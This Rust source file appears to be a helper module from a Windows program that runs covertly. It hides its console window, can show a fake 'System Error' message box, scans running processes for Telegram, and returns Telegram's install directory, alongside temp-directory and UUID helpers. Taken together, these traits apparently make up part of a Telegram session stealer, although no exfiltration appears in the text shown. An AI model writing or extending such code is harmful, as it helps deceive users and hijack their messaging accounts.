use std::env;
#[cfg(target_os = "windows")]
use std::{ffi::CString, ptr};

use crate::Path;

use ntapi::ntexapi::{
    NtQuerySystemInformation, SystemProcessInformation, SYSTEM_PROCESS_INFORMATION,
};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::winbase::QueryFullProcessImageNameW;

use winapi::um::winnt::{PROCESS_QUERY_LIMITED_INFORMATION, PVOID };
use winapi::shared::minwindef::{MAX_PATH,ULONG, DWORD,FALSE};
use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;

use std::os::windows::ffi::OsStringExt;
use std::ffi::OsString;

#[cfg(target_os = "windows")]
use user32::MessageBoxA;

#[cfg(target_os = "windows")]
use winapi::um::{
    wincon::GetConsoleWindow,
    winuser::{ShowWindow, MB_ICONERROR, MB_OK, SW_HIDE},
};

#[cfg(target_os = "windows")]
pub fn show_error(message: &str) {
    let caption = CString::new("System Error").unwrap();
    let text = CString::new(message).unwrap();
    unsafe {
        MessageBoxA(
            ptr::null_mut(),
            text.as_ptr(),
            caption.as_ptr(),
            MB_OK | MB_ICONERROR,
        );
    }
}

#[cfg(target_os = "windows")]
pub fn hide_console() {
    unsafe {
        let window = GetConsoleWindow();
        if window.is_null() {
            return;
        }
        ShowWindow(window, SW_HIDE);
    }
}

pub fn get_processes_path() -> String {
    let buffer_size: usize = 512 * 1024;
    let mut process_information: Vec<u8> = Vec::with_capacity(buffer_size);
    let mut cb_needed = 0;
    let mut full_process_path : String = ("<unknown>").to_string();
    unsafe {
        process_information.set_len(buffer_size);
        let ntstatus = NtQuerySystemInformation(
            SystemProcessInformation,
            process_information.as_mut_ptr() as PVOID,
            buffer_size as ULONG,
            &mut cb_needed,
        );

        if ntstatus != STATUS_INFO_LENGTH_MISMATCH {
            if ntstatus < 0 {
                println!(
                    "Couldn't get process infos: NtQuerySystemInformation returned {}",
                    ntstatus
                );
            }
        }
        let mut process_information_offset = 0;
        loop {
            let p = process_information
                .as_ptr()
                .offset(process_information_offset)
                as *const SYSTEM_PROCESS_INFORMATION;
            let pi = *p;

            if pi.NextEntryOffset == 0 {
                break;
            }
            let pid = pi.UniqueProcessId as DWORD;
            let name = get_process_name_str(&pi, pid);
            const PATH_NAME_SZ : usize = 1 + MAX_PATH;
            let mut name_sz = PATH_NAME_SZ as u32;
            if name.contains("Teleg") {
                println!( "{}:{}", name, pid);
                let mut process_name = [0u16; PATH_NAME_SZ];
                let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
                QueryFullProcessImageNameW(
                    handle,
                    0,
                    process_name.as_mut_ptr(),
                    &mut name_sz
                );
                println!( "{}: {} : {}", null_terminated_wchar_to_string(&process_name), name, pid);
                full_process_path = null_terminated_wchar_to_string(&process_name);
            }
            process_information_offset += pi.NextEntryOffset as isize;
        }
    }
    let path = Path::new(&full_process_path);
    let parent = path.parent();
    match parent {
        None => full_process_path = "Not found".to_owned(),
        Some(t) => full_process_path =  String::from((*t).to_string_lossy())
    }
    full_process_path
}

unsafe fn null_terminated_wchar_to_string(slice: &[u16]) -> String {
    match slice.iter().position(|&x| x == 0) {
        Some(pos) => OsString::from_wide(&slice[..pos])
            .to_string_lossy()
            .into_owned(),
        None => OsString::from_wide(slice).to_string_lossy().into_owned(),
    }
}

#[allow(clippy::size_of_in_element_count)]
//^ needed for "name.Length as usize / std::mem::size_of::<u16>()"
pub(crate) fn get_process_name_str(process: &SYSTEM_PROCESS_INFORMATION, process_id: DWORD) -> String {
    let name = &process.ImageName;
    if name.Buffer.is_null() {
        match process_id {
            0 => "Idle".to_owned(),
            4 => "System".to_owned(),
            _ => format!("<no name> Process {}", process_id),
        }
    } else {
        unsafe {
            let slice = std::slice::from_raw_parts(
                name.Buffer,
                // The length is in bytes, not the length of string
                name.Length as usize / std::mem::size_of::<u16>(),
            );

            String::from_utf16_lossy(slice)
        }
    }
}

/*
pub fn get_directory_by_process(process_name: &str) -> Option<String> {
    let mut system = sysinfo::System::new();
    let filter = ProcessRefreshKind::new();
    system.refresh_processes_specifics(filter.without_cpu().without_disk_usage());
    let telegram = system.processes_by_name(process_name).next()?;
    Some(telegram.root().display().to_string())
}
*/
pub fn get_temp_dir_path() -> Result<String, String> {
    let path = env::temp_dir().display().to_string();
    if path.is_empty() {
        return Err("Error get temp dir!".to_string());
    }
    Ok(path)
}

#[must_use]
pub fn generate_uuid() -> String {
    uuid::Uuid::new_v4().to_string()
}

mod host {}
